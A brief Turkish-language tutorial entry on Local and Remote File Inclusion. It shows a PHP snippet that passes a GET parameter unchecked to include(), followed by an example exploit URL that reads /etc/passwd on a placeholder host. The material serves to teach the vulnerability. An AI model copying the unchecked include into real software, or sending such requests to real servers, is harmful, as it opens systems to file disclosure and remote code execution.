🟡 3. Local File Inclusion (LFI) & Remote File Inclusion (RFI)
Açıklama:

LFI: Sunucudaki yerel dosyaları okumaya yarar.

RFI: Uzak sunucudan kötü amaçlı dosya çalıştırmaya izin verir.

```
<?php
// Sayfa parametresini al
$page = $_GET['page'] ?? 'home.php';

// Güvenlik kontrolü yok, doğrudan dosya çağırıyor
include($page);
?>
```

### exploit
```
http://example.com/index.php?page=/etc/passwd
```
